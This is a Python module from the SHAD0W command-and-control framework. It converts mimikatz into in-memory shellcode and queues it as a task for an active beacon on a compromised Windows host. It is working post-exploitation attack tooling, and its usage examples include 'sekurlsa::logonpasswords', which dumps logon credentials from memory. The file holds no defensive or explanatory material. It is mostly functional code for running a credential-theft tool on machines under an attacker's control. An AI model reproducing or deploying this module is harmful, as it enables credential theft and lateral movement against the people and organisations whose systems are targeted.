#
# Execute mimikatz on a session
#

import argparse
import base64
import shellcode

__description__ = "Execute mimikatz commands in memory on the target"
__author__ = "@_batsec_, @gentilkiwi"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of mimikatz binary
MIMIKATZ_BIN = "bin\mimikatz.exe"

# did the command error
ERROR = False
error_list = ""

# let argparse error and exit nice

def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def mimikatz_callback(shad0w, data):
    data = base64.b64decode(data) 
    data = data.decode()
    data = data.replace(".#####.", "\033[32m.#####.\033[0m")
    data = data.replace(".## ^ ##.", "\033[32m.##\033[0m \033[39m^\033[0m \033[32m##.\033[0m")
    data = data.replace("## / \\ ##", "\033[32m##\033[0m \033[39m/ \\\033[32m \033[32m##\033[0m")
    data = data.replace("## \\ / ##", "\033[32m##\033[0m \033[39m\\ /\033[32m \033[32m##\033[0m")
    data = data.replace("'## v ##'", "\033[32m'##\033[0m \033[39mv\033[32m \033[32m##'\033[0m")
    data = data.replace("'#####'", "\033[32m'#####'\033[0m")

    print(data)

    return ""

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    # usage examples
    usage_examples = """

Examples:

mimikatz
mimikatz -x coffee
mimikatz -x sekurlsa::logonpasswords
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='mimikatz',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-x", "--execute", nargs='+', required=True, help="Mimikatz command to execute")
    parse.add_argument("-n", "--no-exit", action="store_true", required=False, help="Leave mimikatz running")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if not args.execute:
        print(error_list) 
        parse.print_help()
        return
    
    if args.execute:
        params = ' '.join(args.execute)

        if not args.no_exit:
            params = params + " exit"
        
        # kinda a hack to make sure we intergrate nice with the shellcode generator 
        args.param = args.execute
        args.cls = None#False
        args.method = None
        args.runtime = None
        args.appdomain = None

        b64_comp_data = shellcode.generate(MIMIKATZ_BIN, args, params)
    
    shad0w.beacons[shad0w.current_beacon]["task"] = "EC1 "+ b64_comp_data
    shad0w.beacons[shad0w.current_beacon]["callback"] = mimikatz_callback